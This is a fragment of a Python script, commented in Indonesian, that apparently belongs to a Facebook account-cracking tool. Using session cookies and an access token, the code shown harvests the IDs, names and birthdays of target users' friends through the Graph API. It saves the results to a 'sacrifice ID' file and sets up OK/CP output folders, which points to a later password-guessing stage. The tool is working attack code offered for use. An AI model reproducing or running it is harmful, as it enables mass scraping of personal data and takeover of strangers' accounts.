		for ggkgittorr in range(mil):
			angka+=1
			kontole = input(f"{p}│{b}{str(angka)}. {p}masukan id : ")
			uid.append(kontole)
		for userr in uid:
			try:
				params = {"access_token": token, "fields": "name,friends.fields(id,name,birthday)"}
				for mek in ses.get("https://graph.facebook.com/{}".format(userr),params = params,cookies = kuki).json()['friends']['data']:
					try:
						ids.append(mek['id']+'|'+mek['name'])
					except:continue
			except (KeyError,IOError):pass
			except requests.exceptions.ConnectionError:
				print(f"{shit} sinyal anda bermasalah.. ");exit()
		print(f"{shit} total target id : {str(len(ids))} ")
		self.METHODsetting()
	'''convert cookies'''
	def Convertt(self,cookie):
		cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
		return(str(cok))
	''' nuyul 1 id biar makin banyak '''
	def NuyulId(self, cookie, token):
		kuntol, tutlu = 0, []
		it = input(f"{shit} id target : ")
		try:
			print()
			params = {
					"access_token": token, 
					"fields": "name,friends.fields(id,name,birthday)"
			}
			ka = requests.get('https://graph.facebook.com/%s'%(it),params = params,cookies = cookie).json()
			for fuck in ka['friends']['data']:
				tutlu.append(fuck['id'])
			cyna = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token),cookies = cookie).json()
			tree = Tree(Panel.fit(f"[green] sukses dump... ",style=f"white"))
			tree.add(Panel.fit(f"[green] {cyna['name']}",style=f"white"))
			tree.add(Panel.fit(f"[green]{len(tutlu)}",style = "white"))
			vprint(tree)
		except (KeyError,IOError):
			exit()
		tl, to, ttl_tar, tlo, idl = [], [], [], [], []
		params = {
					"access_token": token, 
					"fields": "name,friends.fields(id,name,birthday)"
		}
		ka = requests.get('https://graph.facebook.com/%s'%(it),params = params,cookies = cookie).json()
		for fuck in ka['friends']['data']:
			tl.append(fuck['id'])
		anj = []
		anjv = []
		anj.append(Panel(f"[white]a. dump id urutan new",width=35,style=f"white"))
		anj.append(Panel(f"[white]b. dump id urutan old",width=35,style=f"white"))
		anjv.append(Panel(f"\t\t      [white]c. dump id urutan acak",width=71,style=f"white"))
		console.print(columns(anj))
		console.print(columns(anjv))
		pilid = input(f"{shit} choose : ")
		if pilid in ['b','B']:
			for yatim in tl:
				idl.append(yatim)
		elif pilid in ['a','A']:
			for yatim in tl:
				idl.insert(0,yatim)
		else:
			for yatim in tl:
				xx = rr(0,len(idl))
				idl.insert(xx,yatim)
		for uik in idl:
			try:
				params = {
					"access_token": token, 
					"fields": "name,friends.fields(id,name,birthday)"
				}
				cyna = requests.get('https://graph.facebook.com/%s'%(uik),params = params,cookies = cookie).json()
				try:
					for fuck in cyna['friends']['data']:
						to.append(fuck['id']+'|'+fuck['name'])
				except KeyError:
					pass
				except (ChunkedEncodingError,ConnectionError):
					turu(31)
				kuntol+=1
				tree = Tree(Panel.fit(f"[red]{str(kuntol)}[white].[green] {uik}|{len(to)}",style=f"white"))
				vprint(tree)
				open("IdTumbal.txt","a").write(uik+"|"+str(len(to))+"\n")
				to.clear()
			except KeyError:
				tree = Tree(Panel.fit(f"[red]anda terkena spam..",style=f"red"))
				vprint(tree)
			except (ChunkedEncodingError,ConnectionError):
				turu(31)
		print("")
		anj = []
		anj.append(Panel(f"[white]   salin hasil nuyulnya bang, biar ga ngulang...",width=35,style=f"white"))
		console.print(columns(anj))
''' mainkan coeg '''
if __name__ in "__main__":
	try:os.mkdir("OK")
	except:pass
	try:os.mkdir("CP")
	except:pass
	MAINmenu()
''' rikod aja sepuas lo pukimak '''
